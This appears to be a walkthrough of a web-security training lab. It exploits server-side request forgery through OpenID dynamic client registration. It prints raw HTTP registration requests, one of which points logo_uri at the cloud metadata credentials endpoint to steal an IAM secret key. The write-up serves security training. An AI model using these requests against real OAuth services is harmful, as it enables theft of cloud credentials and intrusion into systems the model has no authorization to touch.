Title: SSRF via OpenID dynamic client registration
Level: PRACTITIONER
Desc: his lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough:
To access OpenID configuration file we need to refer to: `/.well-known/openid-configuration`
<img width="1887" height="316" alt="image" src="https://github.com/user-attachments/assets/9a5f3d15-2622-4403-8138-866e583509dc" />
Endpoint for registration is: `https://oauth-0a5800ed0365075d81e94299022600ff.oauth-server.net/reg`

Create a POST request to register client application with the OAuth service. Need to provide redirect_uris array containing an arbitrary whitelist of callback URIs for pur fake application.

```
POST /reg HTTP/1.1
Host: oauth-0a5800ed0365075d81e94299022600ff.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
<img width="1261" height="705" alt="image" src="https://github.com/user-attachments/assets/fa939540-ca96-49d7-a1db-a8b291caf041" />
After sending POST request I can see, that my fake app is registered without authentication and we have client id.
`"client_id":"1v21-WLHAVLGGYghVQTr9",`

We can see on the authorization page, that logo of the page is from openid configuration.
<img width="1252" height="643" alt="image" src="https://github.com/user-attachments/assets/d1e43d94-d817-47c0-9573-ac0db1f8f33d" />

So that's our SSRF.
Let's create new client application and this time let's provide also URI to our "logo":
```
POST /reg HTTP/2
Host: oauth-0a5800ed0365075d81e94299022600ff.oauth-server.net
Content-Type: application/json
Content-Length: 67

{
    "redirect_uris" : [
        "https://example.com"
    ],
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
```
and let's request that logo using GET from authorize page resource.

Our logo:
<img width="1281" height="396" alt="image" src="https://github.com/user-attachments/assets/80d97092-a58c-4570-bb7b-720a305d6a71" />

We did it!
